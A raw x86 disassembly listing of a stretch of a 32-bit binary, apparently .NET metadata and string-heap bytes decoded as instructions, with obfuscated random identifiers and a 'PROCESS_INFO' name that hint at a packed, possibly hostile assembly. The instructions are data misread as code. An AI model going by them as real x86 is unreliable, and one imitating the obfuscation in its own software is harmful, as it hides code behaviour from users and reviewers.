100025f1:	00 69 05             	add    %ch,0x5(%ecx)
100025f4:	c0 07 06             	rolb   $0x6,(%edi)
100025f7:	00 b3 07 56 06 06    	add    %dh,0x6065607(%ebx)
100025fd:	00 a0 05 56 06 06    	add    %ah,0x6065605(%eax)
10002603:	00 3d 03 58 05 06    	add    %bh,0x6055803
10002609:	00 65 08             	add    %ah,0x8(%ebp)
1000260c:	1a 02                	sbb    (%edx),%al
1000260e:	06                   	push   %es
1000260f:	00 a6 06 1a 02 06    	add    %ah,0x6021a06(%esi)
10002615:	00 81 00 56 06 0e    	add    %al,0xe065600(%ecx)
1000261b:	00 74 03 ea          	add    %dh,-0x16(%ebx,%eax,1)
1000261f:	06                   	push   %es
10002620:	06                   	push   %es
10002621:	00 6c 00 e4          	add    %ch,-0x1c(%eax,%eax,1)
10002625:	02 06                	add    (%esi),%al
10002627:	00 5d 06             	add    %bl,0x6(%ebp)
1000262a:	56                   	push   %esi
1000262b:	06                   	push   %es
1000262c:	06                   	push   %es
1000262d:	00 f3                	add    %dh,%bl
1000262f:	05 1a 02 00 00       	add    $0x21a,%eax
10002634:	00 00                	add    %al,(%eax)
10002636:	30 01                	xor    %al,(%ecx)
10002638:	00 00                	add    %al,(%eax)
1000263a:	00 00                	add    %al,(%eax)
1000263c:	01 00                	add    %eax,(%eax)
1000263e:	01 00                	add    %eax,(%eax)
10002640:	81 01 10 00 33 05    	addl   $0x5330010,(%ecx)
10002646:	33 05 41 00 01 00    	xor    0x10041,%eax
1000264c:	01 00                	add    %eax,(%eax)
1000264e:	0b 01                	or     (%ecx),%eax
10002650:	10 00                	adc    %al,(%eax)
10002652:	c2 01 00             	ret    $0x1
10002655:	00 51 00             	add    %dl,0x0(%ecx)
10002658:	01 00                	add    %eax,(%eax)
1000265a:	09 00                	or     %eax,(%eax)
1000265c:	0b 01                	or     (%ecx),%eax
1000265e:	10 00                	adc    %al,(%eax)
10002660:	0e                   	push   %cs
10002661:	02 00                	add    (%eax),%al
10002663:	00 51 00             	add    %dl,0x0(%ecx)
10002666:	05 00 09 00 03       	add    $0x3000900,%eax
1000266b:	01 10                	add    %edx,(%eax)
1000266d:	00 01                	add    %al,(%ecx)
1000266f:	00 00                	add    %al,(%eax)
10002671:	00 41 00             	add    %al,0x0(%ecx)
10002674:	17                   	pop    %ss
10002675:	00 09                	add    %cl,(%ecx)
10002677:	00 06                	add    %al,(%esi)
10002679:	00 a7 05 33 00 06    	add    %ah,0x6003305(%edi)
1000267f:	00 4e 02             	add    %cl,0x2(%esi)
10002682:	33 00                	xor    (%eax),%eax
10002684:	06                   	push   %es
10002685:	00 90 01 cf 00 06    	add    %dl,0x600cf01(%eax)
1000268b:	00 f8                	add    %bh,%al
1000268d:	05 cf 00 06 00       	add    $0x600cf,%eax
10002692:	d8 02                	fadds  (%edx)
10002694:	cf                   	iret
10002695:	00 06                	add    %al,(%esi)
10002697:	00 a2 07 d2 00 06    	add    %ah,0x600d207(%edx)
1000269d:	00 38                	add    %bh,(%eax)
1000269f:	08 d2                	or     %dl,%dl
100026a1:	00 06                	add    %al,(%esi)
100026a3:	00 88 00 d2 00 06    	add    %cl,0x600d200(%eax)
100026a9:	00 a7 02 d5 00 06    	add    %ah,0x600d502(%edi)
100026af:	00 ab 02 d5 00 06    	add    %ch,0x600d502(%ebx)
100026b5:	00 98 02 d5 00 06    	add    %bl,0x600d502(%eax)
100026bb:	00 36                	add    %dh,(%esi)
100026bd:	02 d5                	add    %ch,%dl
100026bf:	00 06                	add    %al,(%esi)
100026c1:	00 c5                	add    %al,%ch
100026c3:	00 d5                	add    %dl,%ch
100026c5:	00 06                	add    %al,(%esi)
100026c7:	00 09                	add    %cl,(%ecx)
100026c9:	01 d5                	add    %edx,%ebp
100026cb:	00 06                	add    %al,(%esi)
100026cd:	00 05 08 d5 00 06    	add    %al,0x600d508
100026d3:	00 f6                	add    %dh,%dh
100026d5:	06                   	push   %es
100026d6:	d5 00                	aad    $0x0
100026d8:	06                   	push   %es
100026d9:	00 dc                	add    %bl,%ah
100026db:	07                   	pop    %es
100026dc:	d8 00                	fadds  (%eax)
100026de:	06                   	push   %es
100026df:	00 73 02             	add    %dh,0x2(%ebx)
100026e2:	d8 00                	fadds  (%eax)
100026e4:	06                   	push   %es
100026e5:	00 ec                	add    %ch,%ah
100026e7:	00 33                	add    %dh,(%ebx)
100026e9:	00 06                	add    %al,(%esi)
100026eb:	00 fa                	add    %bh,%dl
100026ed:	01 33                	add    %esi,(%ebx)
100026ef:	00 06                	add    %al,(%esi)
100026f1:	00 d6                	add    %dl,%dh
100026f3:	01 33                	add    %esi,(%ebx)
100026f5:	00 06                	add    %al,(%esi)
100026f7:	00 ee                	add    %ch,%dh
100026f9:	07                   	pop    %es
100026fa:	33 00                	xor    (%eax),%eax
100026fc:	06                   	push   %es
100026fd:	00 1e                	add    %bl,(%esi)
100026ff:	01 db                	add    %ebx,%ebx
10002701:	00 00                	add    %al,(%eax)
10002703:	00 00                	add    %al,(%eax)
10002705:	00 80 00 91 20 52    	add    %al,0x52209100(%eax)
1000270b:	08 e2                	or     %ah,%dl
1000270d:	00 01                	add    %al,(%ecx)
1000270f:	00 00                	add    %al,(%eax)
10002711:	00 00                	add    %al,(%eax)
10002713:	00 80 00 91 20 7f    	add    %al,0x7f209100(%eax)
10002719:	03 ed                	add    %ebp,%ebp
1000271b:	00 06                	add    %al,(%esi)
1000271d:	00 00                	add    %al,(%eax)
1000271f:	00 00                	add    %al,(%eax)
10002721:	00 80 00 91 20 8d    	add    %al,-0x72df6f00(%eax)
10002727:	07                   	pop    %es
10002728:	f2 00 07             	repnz add %al,(%edi)
1000272b:	00 00                	add    %al,(%eax)
1000272d:	00 00                	add    %al,(%eax)
1000272f:	00 80 00 91 20 14    	add    %al,0x14209100(%eax)
10002735:	08 04 01             	or     %al,(%ecx,%eax,1)
10002738:	11 00                	adc    %eax,(%eax)
1000273a:	00 00                	add    %al,(%eax)
1000273c:	00 00                	add    %al,(%eax)
1000273e:	80 00 91             	addb   $0x91,(%eax)
10002741:	20 31                	and    %dh,(%ecx)
10002743:	03 0d 01 16 00 00    	add    0x1601,%ecx
10002749:	00 00                	add    %al,(%eax)
1000274b:	00 80 00 91 20 1f    	add    %al,0x1f209100(%eax)
10002751:	03 19                	add    (%ecx),%ebx
10002753:	01 1d 00 50 20 00    	add    %ebx,0x205000
10002759:	00 00                	add    %al,(%eax)
1000275b:	00 96 00 64 06 20    	add    %dl,0x20066400(%esi)
10002761:	01 1f                	add    %ebx,(%edi)
10002763:	00 0c 22             	add    %cl,(%edx,%eiz,1)
10002766:	00 00                	add    %al,(%eax)
10002768:	00 00                	add    %al,(%eax)
1000276a:	93                   	xchg   %eax,%ebx
1000276b:	00 16                	add    %dl,(%esi)
1000276d:	00 27                	add    %ah,(%edi)
1000276f:	01 21                	add    %esp,(%ecx)
10002771:	00 7a 24             	add    %bh,0x24(%edx)
10002774:	00 00                	add    %al,(%eax)
10002776:	00 00                	add    %al,(%eax)
10002778:	86 18                	xchg   %bl,(%eax)
1000277a:	0d 07 06 00 21       	or     $0x21000607,%eax
1000277f:	00 82 24 00 00 00    	add    %al,0x24(%edx)
10002785:	00 83 00 52 00 2b    	add    %al,0x2b005200(%ebx)
1000278b:	01 21                	add    %esp,(%ecx)
1000278d:	00 00                	add    %al,(%eax)
1000278f:	00 01                	add    %al,(%ecx)
10002791:	00 a7 05 00 00 02    	add    %ah,0x2000005(%edi)
10002797:	00 67 01             	add    %ah,0x1(%edi)
1000279a:	00 00                	add    %al,(%eax)
1000279c:	03 00                	add    (%eax),%eax
1000279e:	cc                   	int3
1000279f:	07                   	pop    %es
100027a0:	00 00                	add    %al,(%eax)
100027a2:	04 00                	add    $0x0,%al
100027a4:	0e                   	push   %cs
100027a5:	03 02                	add    (%edx),%eax
100027a7:	00 05 00 78 01 00    	add    %al,0x17800
100027ad:	00 01                	add    %al,(%ecx)
100027af:	00 41 00             	add    %al,0x0(%ecx)
100027b2:	00 00                	add    %al,(%eax)
100027b4:	01 00                	add    %eax,(%eax)
100027b6:	d9 05 00 00 02 00    	flds   0x20000
100027bc:	ea 01 00 00 03 00 83 	ljmp   $0x8300,$0x3000001
100027c3:	02 00                	add    (%eax),%al
100027c5:	00 04 00             	add    %al,(%eax,%eax,1)
100027c8:	42                   	inc    %edx
100027c9:	05 00 00 05 00       	add    $0x50000,%eax
100027ce:	da 00                	fiaddl (%eax)
100027d0:	00 00                	add    %al,(%eax)
100027d2:	06                   	push   %es
100027d3:	00 39                	add    %bh,(%ecx)
100027d5:	01 00                	add    %eax,(%eax)
100027d7:	00 07                	add    %al,(%edi)
100027d9:	00 10                	add    %dl,(%eax)
100027db:	06                   	push   %es
100027dc:	00 00                	add    %al,(%eax)
100027de:	08 00                	or     %al,(%eax)
100027e0:	af                   	scas   %es:(%edi),%eax
100027e1:	02 00                	add    (%eax),%al
100027e3:	00 09                	add    %cl,(%ecx)
100027e5:	00 7b 08             	add    %bh,0x8(%ebx)
100027e8:	02 00                	add    (%eax),%al
100027ea:	0a 00                	or     (%eax),%al
100027ec:	c0 05 00 00 01 00 a7 	rolb   $0xa7,0x10000
100027f3:	05 00 00 02 00       	add    $0x20000,%eax
100027f8:	a9 01 00 00 03       	test   $0x3000001,%eax
100027fd:	00 63 02             	add    %ah,0x2(%ebx)
10002800:	00 00                	add    %al,(%eax)
10002802:	04 00                	add    $0x0,%al
10002804:	53                   	push   %ebx
10002805:	01 00                	add    %eax,(%eax)
10002807:	00 05 00 24 02 00    	add    %al,0x22400
1000280d:	00 01                	add    %al,(%ecx)
1000280f:	00 a7 05 00 00 02    	add    %ah,0x2000005(%edi)
10002815:	00 42 05             	add    %al,0x5(%edx)
10002818:	00 00                	add    %al,(%eax)
1000281a:	03 00                	add    (%eax),%eax
1000281c:	be 02 00 00 04       	mov    $0x4000002,%esi
10002821:	00 9e 00 00 00 05    	add    %bl,0x5000000(%esi)
10002827:	00 23                	add    %ah,(%ebx)
10002829:	08 00                	or     %al,(%eax)
1000282b:	00 06                	add    %al,(%esi)
1000282d:	00 39                	add    %bh,(%ecx)
1000282f:	01 02                	add    %eax,(%edx)
10002831:	00 07                	add    %al,(%edi)
10002833:	00 b1 00 00 00 01    	add    %dh,0x1000000(%ecx)
10002839:	00 4e 02             	add    %cl,0x2(%esi)
1000283c:	02 00                	add    (%eax),%al
1000283e:	02 00                	add    (%eax),%al
10002840:	c8 06 00 00          	enter  $0x6,$0x0
10002844:	01 00                	add    %eax,(%eax)
10002846:	5e                   	pop    %esi
10002847:	03 00                	add    (%eax),%eax
10002849:	00 02                	add    %al,(%edx)
1000284b:	00 d8                	add    %bl,%al
1000284d:	06                   	push   %es
1000284e:	00 00                	add    %al,(%eax)
10002850:	01 00                	add    %eax,(%eax)
10002852:	8b 03                	mov    (%ebx),%eax
10002854:	09 00                	or     %eax,(%eax)
10002856:	0d 07 01 00 11       	or     $0x11000107,%eax
1000285b:	00 0d 07 06 00 19    	add    %cl,0x19000607
10002861:	00 0d 07 0a 00 29    	add    %cl,0x29000a07
10002867:	00 0d 07 10 00 31    	add    %cl,0x31001007
1000286d:	00 0d 07 10 00 39    	add    %cl,0x39001007
10002873:	00 0d 07 10 00 41    	add    %cl,0x41001007
10002879:	00 0d 07 10 00 49    	add    %cl,0x49001007
1000287f:	00 0d 07 10 00 51    	add    %cl,0x51001007
10002885:	00 0d 07 10 00 59    	add    %cl,0x59001007
1000288b:	00 0d 07 10 00 61    	add    %cl,0x61001007
10002891:	00 0d 07 15 00 69    	add    %cl,0x69001507
10002897:	00 0d 07 10 00 71    	add    %cl,0x71001007
1000289d:	00 0d 07 10 00 79    	add    %cl,0x79001007
100028a3:	00 0d 07 10 00 99    	add    %cl,0x99001007
100028a9:	00 0d 07 06 00 b1    	add    %cl,0xb1000607
100028af:	00 2c 05 27 00 b9 00 	add    %ch,0xb90027(,%eax,1)
100028b6:	bd 06 33 00 b9       	mov    $0xb9003306,%ebp
100028bb:	00 6f 08             	add    %ch,0x8(%edi)
100028be:	36 00 c1             	ss add %al,%cl
100028c1:	00 00                	add    %al,(%eax)
100028c3:	01 3c 00             	add    %edi,(%eax,%eax,1)
100028c6:	c9                   	leave
100028c7:	00 8c 05 41 00 c1 00 	add    %cl,0xc10041(%ebp,%eax,1)
100028ce:	9d                   	popf
100028cf:	05 47 00 d1 00       	add    $0xd10047,%eax
100028d4:	56                   	push   %esi
100028d5:	03 4d 00             	add    0x0(%ebp),%ecx
100028d8:	91                   	xchg   %eax,%ecx
100028d9:	00 0d 07 10 00 d9    	add    %cl,0xd9001007
100028df:	00 c2                	add    %al,%dl
100028e1:	06                   	push   %es
100028e2:	53                   	push   %ebx
100028e3:	00 89 00 ff 02 58    	add    %cl,0x5802ff00(%ecx)
100028e9:	00 89 00 48 03 5e    	add    %cl,0x5e034800(%ecx)
100028ef:	00 89 00 51 06 06    	add    %cl,0x6065100(%ecx)
100028f5:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028f8:	0d 07 06 00 0c       	or     $0xc000607,%eax
100028fd:	00 44 03 6f          	add    %al,0x6f(%ebx,%eax,1)
10002901:	00 e1                	add    %ah,%cl
10002903:	00 7b 07             	add    %bh,0x7(%ebx)
10002906:	75 00                	jne    0x10002908
10002908:	14 00                	adc    $0x0,%al
1000290a:	0d 07 85 00 f9       	or     $0xf9008507,%eax
1000290f:	00 9a 03 8b 00 f9    	add    %bl,-0x6ff74fd(%edx)
10002915:	00 4a 08             	add    %cl,0x8(%edx)
10002918:	a8 00                	test   $0x0,%al
1000291a:	09 01                	or     %eax,(%ecx)
1000291c:	0d 07 06 00 09       	or     $0x9000607,%eax
10002921:	01 bb 07 b6 00 81    	add    %edi,-0x7eff49f9(%ebx)
10002927:	00 0d 07 06 00 11    	add    %cl,0x11000607
1000292d:	01 78 06             	add    %edi,0x6(%eax)
10002930:	bb 00 0c 00 84       	mov    $0x84000c00,%ebx
10002935:	07                   	pop    %es
10002936:	c0 00 2e             	rolb   $0x2e,(%eax)
10002939:	00 0b                	add    %cl,(%ebx)
1000293b:	00 30                	add    %dh,(%eax)
1000293d:	01 2e                	add    %ebp,(%esi)
1000293f:	00 13                	add    %dl,(%ebx)
10002941:	00 39                	add    %bh,(%ecx)
10002943:	01 2e                	add    %ebp,(%esi)
10002945:	00 1b                	add    %bl,(%ebx)
10002947:	00 58 01             	add    %bl,0x1(%eax)
1000294a:	2e 00 23             	add    %ah,%cs:(%ebx)
1000294d:	00 61 01             	add    %ah,0x1(%ecx)
10002950:	2e 00 2b             	add    %ch,%cs:(%ebx)
10002953:	00 75 01             	add    %dh,0x1(%ebp)
10002956:	2e 00 33             	add    %dh,%cs:(%ebx)
10002959:	00 75 01             	add    %dh,0x1(%ebp)
1000295c:	2e 00 3b             	add    %bh,%cs:(%ebx)
1000295f:	00 75 01             	add    %dh,0x1(%ebp)
10002962:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
10002966:	61                   	popa
10002967:	01 2e                	add    %ebp,(%esi)
10002969:	00 4b 00             	add    %cl,0x0(%ebx)
1000296c:	7b 01                	jnp    0x1000296f
1000296e:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
10002972:	75 01                	jne    0x10002975
10002974:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
10002978:	75 01                	jne    0x1000297b
1000297a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
1000297e:	93                   	xchg   %eax,%ebx
1000297f:	01 2e                	add    %ebp,(%esi)
10002981:	00 6b 00             	add    %ch,0x0(%ebx)
10002984:	bd 01 2e 00 73       	mov    $0x73002e01,%ebp
10002989:	00 ca                	add    %cl,%dl
1000298b:	01 a3 00 7b 00 14    	add    %esp,0x14007b00(%ebx)
10002991:	02 00                	add    (%eax),%al
10002993:	01 7b 00             	add    %edi,0x0(%ebx)
10002996:	14 02                	adc    $0x2,%al
10002998:	1a 00                	sbb    (%eax),%al
1000299a:	62 00                	bound  %eax,(%eax)
1000299c:	31 06                	xor    %eax,(%esi)
1000299e:	69 00 7e 00 40 01    	imul   $0x140007e,(%eax),%eax
100029a4:	03 00                	add    (%eax),%eax
100029a6:	52                   	push   %edx
100029a7:	08 01                	or     %al,(%ecx)
100029a9:	00 00                	add    %al,(%eax)
100029ab:	01 05 00 7f 03 01    	add    %eax,0x1037f00
100029b1:	00 40 01             	add    %al,0x1(%eax)
100029b4:	07                   	pop    %es
100029b5:	00 8d 07 01 00 40    	add    %cl,0x40000107(%ebp)
100029bb:	01 09                	add    %ecx,(%ecx)
100029bd:	00 14 08             	add    %dl,(%eax,%ecx,1)
100029c0:	01 00                	add    %eax,(%eax)
100029c2:	40                   	inc    %eax
100029c3:	01 0b                	add    %ecx,(%ebx)
100029c5:	00 31                	add    %dh,(%ecx)
100029c7:	03 01                	add    (%ecx),%eax
100029c9:	00 40 01             	add    %al,0x1(%eax)
100029cc:	0d 00 1f 03 01       	or     $0x1031f00,%eax
100029d1:	00 04 80             	add    %al,(%eax,%eax,4)
100029d4:	00 00                	add    %al,(%eax)
100029d6:	01 00                	add    %eax,(%eax)
	...
100029e4:	33 05 00 00 04 00    	xor    0x40000,%eax
	...
100029f2:	00 00                	add    %al,(%eax)
100029f4:	c6 00 db             	movb   $0xdb,(%eax)
100029f7:	02 00                	add    (%eax),%al
100029f9:	00 00                	add    %al,(%eax)
100029fb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002a06:	00 00                	add    %al,(%eax)
10002a08:	c6 00 56             	movb   $0x56,(%eax)
10002a0b:	06                   	push   %es
10002a0c:	00 00                	add    %al,(%eax)
10002a0e:	00 00                	add    %al,(%eax)
10002a10:	04 00                	add    $0x0,%al
	...
10002a1a:	00 00                	add    %al,(%eax)
10002a1c:	c6 00 a0             	movb   $0xa0,(%eax)
10002a1f:	03 00                	add    (%eax),%eax
10002a21:	00 00                	add    %al,(%eax)
10002a23:	00 03                	add    %al,(%ebx)
10002a25:	00 02                	add    %al,(%edx)
10002a27:	00 04 00             	add    %al,(%eax,%eax,1)
10002a2a:	02 00                	add    (%eax),%al
10002a2c:	05 00 02 00 21       	add    $0x21000200,%eax
10002a31:	00 2e                	add    %ch,(%esi)
10002a33:	00 41 00             	add    %al,0x0(%ecx)
10002a36:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a37:	00 43 00             	add    %al,0x0(%ebx)
10002a3a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a3b:	00 00                	add    %al,(%eax)
10002a3d:	00 00                	add    %al,(%eax)
10002a3f:	00 00                	add    %al,(%eax)
10002a41:	3c 3e                	cmp    $0x3e,%al
10002a43:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002a46:	44                   	inc    %esp
10002a47:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002a4e:	6c                   	insb   (%dx),%es:(%edi)
10002a4f:	61                   	popa
10002a50:	73 73                	jae    0x10002ac5
10002a52:	38 5f 30             	cmp    %bl,0x30(%edi)
10002a55:	00 3c 47             	add    %bh,(%edi,%eax,2)
10002a58:	67 4d                	addr16 dec %ebp
10002a5a:	47                   	inc    %edi
10002a5b:	43                   	inc    %ebx
10002a5c:	79 6d                	jns    0x10002acb
10002a5e:	76 43                	jbe    0x10002aa3
10002a60:	4d                   	dec    %ebp
10002a61:	50                   	push   %eax
10002a62:	33 70 41             	xor    0x41(%eax),%esi
10002a65:	74 48                	je     0x10002aaf
10002a67:	55                   	push   %ebp
10002a68:	51                   	push   %ecx
10002a69:	6e                   	outsb  %ds:(%esi),(%dx)
10002a6a:	3e 67 5f             	ds addr16 pop %edi
10002a6d:	5f                   	pop    %edi
10002a6e:	51                   	push   %ecx
10002a6f:	69 4c 48 45 52 75 6b 	imul   $0x4c6b7552,0x45(%eax,%ecx,2),%ecx
10002a76:	4c 
10002a77:	75 74                	jne    0x10002aed
10002a79:	39 35 62 7c 38 5f    	cmp    %esi,0x5f387c62
10002a7f:	30 00                	xor    %al,(%eax)
10002a81:	57                   	push   %edi
10002a82:	4e                   	dec    %esi
10002a83:	6b 55 6f 6b          	imul   $0x6b,0x6f(%ebp),%edx
10002a87:	31 44 76 30          	xor    %eax,0x30(%esi,%esi,2)
10002a8b:	4d                   	dec    %ebp
10002a8c:	48                   	dec    %eax
10002a8d:	48                   	dec    %eax
10002a8e:	62 52 31             	bound  %edx,0x31(%edx)
10002a91:	00 3c 47             	add    %bh,(%edi,%eax,2)
10002a94:	67 4d                	addr16 dec %ebp
10002a96:	47                   	inc    %edi
10002a97:	43                   	inc    %ebx
10002a98:	79 6d                	jns    0x10002b07
10002a9a:	76 43                	jbe    0x10002adf
10002a9c:	4d                   	dec    %ebp
10002a9d:	50                   	push   %eax
10002a9e:	33 70 41             	xor    0x41(%eax),%esi
10002aa1:	74 48                	je     0x10002aeb
10002aa3:	55                   	push   %ebp
10002aa4:	51                   	push   %ecx
10002aa5:	6e                   	outsb  %ds:(%esi),(%dx)
10002aa6:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
10002aaa:	31 00                	xor    %eax,(%eax)
10002aac:	49                   	dec    %ecx
10002aad:	45                   	inc    %ebp
10002aae:	6e                   	outsb  %ds:(%esi),(%dx)
10002aaf:	75 6d                	jne    0x10002b1e
10002ab1:	65 72 61             	gs jb  0x10002b15
10002ab4:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002ab8:	31 00                	xor    %eax,(%eax)
10002aba:	4c                   	dec    %esp
10002abb:	69 73 74 60 31 00 46 	imul   $0x46003160,0x74(%ebx),%esi
10002ac2:	75 6e                	jne    0x10002b32
10002ac4:	63 60 32             	arpl   %esp,0x32(%eax)
10002ac7:	00 41 61             	add    %al,0x61(%ecx)
10002aca:	64 56                	fs push %esi
10002acc:	74 78                	je     0x10002b46
10002ace:	47                   	inc    %edi
10002acf:	6b 4d 69 54          	imul   $0x54,0x69(%ebp),%ecx
10002ad3:	37                   	aaa
10002ad4:	38 7a 78             	cmp    %bh,0x78(%edx)
10002ad7:	66 34 33             	data16 xor $0x33,%al
10002ada:	50                   	push   %eax
10002adb:	48                   	dec    %eax
10002adc:	33 00                	xor    (%eax),%eax
10002ade:	49                   	dec    %ecx
10002adf:	46                   	inc    %esi
10002ae0:	46                   	inc    %esi
10002ae1:	57                   	push   %edi
10002ae2:	62 43 5a             	bound  %eax,0x5a(%ebx)
10002ae5:	53                   	push   %ebx
10002ae6:	54                   	push   %esp
10002ae7:	55                   	push   %ebp
10002ae8:	44                   	inc    %esp
10002ae9:	6e                   	outsb  %ds:(%esi),(%dx)
10002aea:	6a 47                	push   $0x47
10002aec:	64 6f                	outsl  %fs:(%esi),(%dx)
10002aee:	5a                   	pop    %edx
10002aef:	33 00                	xor    (%eax),%eax
10002af1:	48                   	dec    %eax
10002af2:	62 6e 51             	bound  %ebp,0x51(%esi)
10002af5:	49                   	dec    %ecx
10002af6:	79 6f                	jns    0x10002b67
10002af8:	64 7a 41             	fs jp  0x10002b3c
10002afb:	46                   	inc    %esi
10002afc:	6b 44 6b 43 70       	imul   $0x70,0x43(%ebx,%ebp,2),%eax
10002b01:	46                   	inc    %esi
10002b02:	4e                   	dec    %esi
10002b03:	34 00                	xor    $0x0,%al
10002b05:	52                   	push   %edx
10002b06:	6f                   	outsl  %ds:(%esi),(%dx)
10002b07:	6f                   	outsl  %ds:(%esi),(%dx)
10002b08:	44                   	inc    %esp
10002b09:	53                   	push   %ebx
10002b0a:	4d                   	dec    %ebp
10002b0b:	45                   	inc    %ebp
10002b0c:	68 78 6f 57 62       	push   $0x62576f78
10002b11:	36 78 4e             	ss js  0x10002b62
10002b14:	49                   	dec    %ecx
10002b15:	6e                   	outsb  %ds:(%esi),(%dx)
10002b16:	77 50                	ja     0x10002b68
10002b18:	34 00                	xor    $0x0,%al
10002b1a:	53                   	push   %ebx
10002b1b:	52                   	push   %edx
10002b1c:	56                   	push   %esi
10002b1d:	79 6f                	jns    0x10002b8e
10002b1f:	41                   	inc    %ecx
10002b20:	46                   	inc    %esi
10002b21:	75 67                	jne    0x10002b8a
10002b23:	69 41 34 53 6d 32 61 	imul   $0x61326d53,0x34(%ecx),%eax
10002b2a:	35 00 4f 53 63       	xor    $0x63534f00,%eax
10002b2f:	5a                   	pop    %edx
10002b30:	49                   	dec    %ecx
10002b31:	58                   	pop    %eax
10002b32:	6a 4b                	push   $0x4b
10002b34:	69 50 71 6c 66 58 33 	imul   $0x3358666c,0x71(%eax),%edx
10002b3b:	46                   	inc    %esi
10002b3c:	66 46                	inc    %si
10002b3e:	36 00 67 65          	add    %ah,%ss:0x65(%edi)
10002b42:	74 5f                	je     0x10002ba3
10002b44:	55                   	push   %ebp
10002b45:	54                   	push   %esp
10002b46:	46                   	inc    %esi
10002b47:	38 00                	cmp    %al,(%eax)
10002b49:	53                   	push   %ebx
10002b4a:	47                   	inc    %edi
10002b4b:	69 48 63 46 75 4a 63 	imul   $0x634a7546,0x63(%eax),%ecx
10002b52:	43                   	inc    %ebx
10002b53:	39 74 51 6a          	cmp    %esi,0x6a(%ecx,%edx,2)
10002b57:	70 66                	jo     0x10002bbf
10002b59:	68 58 6b 38 00       	push   $0x386b58
10002b5e:	43                   	inc    %ebx
10002b5f:	58                   	pop    %eax
10002b60:	58                   	pop    %eax
10002b61:	4c                   	dec    %esp
10002b62:	48                   	dec    %eax
10002b63:	4f                   	dec    %edi
10002b64:	6e                   	outsb  %ds:(%esi),(%dx)
10002b65:	66 38 48 79          	data16 cmp %cl,0x79(%eax)
10002b69:	35 67 42 4c 75       	xor    $0x754c4267,%eax
10002b6e:	38 00                	cmp    %al,(%eax)
10002b70:	3c 4d                	cmp    $0x4d,%al
10002b72:	6f                   	outsl  %ds:(%esi),(%dx)
10002b73:	64 75 6c             	fs jne 0x10002be2
10002b76:	65 3e 00 4f 51       	gs add %cl,%ds:0x51(%edi)
10002b7b:	69 65 50 6f 37 6b 34 	imul   $0x346b376f,0x50(%ebp),%esp
10002b82:	32 70 36             	xor    0x36(%eax),%dh
10002b85:	6b 71 4f 30          	imul   $0x30,0x4f(%ecx),%esi
10002b89:	71 44                	jno    0x10002bcf
10002b8b:	73 4e                	jae    0x10002bdb
10002b8d:	55                   	push   %ebp
10002b8e:	70 4a                	jo     0x10002bda
10002b90:	76 42                	jbe    0x10002bd4
10002b92:	00 46 44             	add    %al,0x44(%esi)
10002b95:	76 5a                	jbe    0x10002bf1
10002b97:	47                   	inc    %edi
10002b98:	61                   	popa
10002b99:	5a                   	pop    %edx
10002b9a:	4d                   	dec    %ebp
10002b9b:	62 70 57             	bound  %esi,0x57(%eax)
10002b9e:	57                   	push   %edi
10002b9f:	33 30                	xor    (%eax),%esi
10002ba1:	46                   	inc    %esi
10002ba2:	72 70                	jb     0x10002c14
10002ba4:	58                   	pop    %eax
10002ba5:	43                   	inc    %ebx
10002ba6:	00 50 49             	add    %dl,0x49(%eax)
10002ba9:	70 4e                	jo     0x10002bf9
10002bab:	63 52 6b             	arpl   %edx,0x6b(%edx)
10002bae:	53                   	push   %ebx
10002baf:	6a 65                	push   $0x65
10002bb1:	4d                   	dec    %ebp
10002bb2:	79 30                	jns    0x10002be4
10002bb4:	41                   	inc    %ecx
10002bb5:	46                   	inc    %esi
10002bb6:	45                   	inc    %ebp
10002bb7:	00 59 78             	add    %bl,0x78(%ecx)
10002bba:	58                   	pop    %eax
10002bbb:	47                   	inc    %edi
10002bbc:	75 50                	jne    0x10002c0e
10002bbe:	32 35 33 61 72 43    	xor    0x43726133,%dh
10002bc4:	6f                   	outsl  %ds:(%esi),(%dx)
10002bc5:	50                   	push   %eax
10002bc6:	43                   	inc    %ebx
10002bc7:	5a                   	pop    %edx
10002bc8:	34 69                	xor    $0x69,%al
10002bca:	34 37                	xor    $0x37,%al
10002bcc:	4c                   	dec    %esp
10002bcd:	41                   	inc    %ecx
10002bce:	47                   	inc    %edi
10002bcf:	00 50 6f             	add    %dl,0x6f(%eax)
10002bd2:	47                   	inc    %edi
10002bd3:	49                   	dec    %ecx
10002bd4:	4b                   	dec    %ebx
10002bd5:	70 63                	jo     0x10002c3a
10002bd7:	37                   	aaa
10002bd8:	4d                   	dec    %ebp
10002bd9:	52                   	push   %edx
10002bda:	51                   	push   %ecx
10002bdb:	4d                   	dec    %ebp
10002bdc:	53                   	push   %ebx
10002bdd:	61                   	popa
10002bde:	63 46 64             	arpl   %eax,0x64(%esi)
10002be1:	51                   	push   %ecx
10002be2:	68 4b 35 62 72       	push   $0x7262354b
10002be7:	4b                   	dec    %ebx
10002be8:	00 52 79             	add    %dl,0x79(%edx)
10002beb:	55                   	push   %ebp
10002bec:	72 59                	jb     0x10002c47
10002bee:	46                   	inc    %esi
10002bef:	6f                   	outsl  %ds:(%esi),(%dx)
10002bf0:	43                   	inc    %ebx
10002bf1:	36 72 4f             	ss jb  0x10002c43
10002bf4:	6c                   	insb   (%dx),%es:(%edi)
10002bf5:	65 52                	gs push %edx
10002bf7:	75 7a                	jne    0x10002c73
10002bf9:	52                   	push   %edx
10002bfa:	65 71 72             	gs jno 0x10002c6f
10002bfd:	4b                   	dec    %ebx
10002bfe:	54                   	push   %esp
10002bff:	76 4d                	jbe    0x10002c4e
10002c01:	00 50 52             	add    %dl,0x52(%eax)
10002c04:	4f                   	dec    %edi
10002c05:	43                   	inc    %ebx
10002c06:	45                   	inc    %ebp
10002c07:	53                   	push   %ebx
10002c08:	53                   	push   %ebx
10002c09:	5f                   	pop    %edi
10002c0a:	49                   	dec    %ecx
10002c0b:	4e                   	dec    %esi
10002c0c:	46                   	inc    %esi
10002c0d:	4f                   	dec    %edi
10002c0e:	52                   	push   %edx
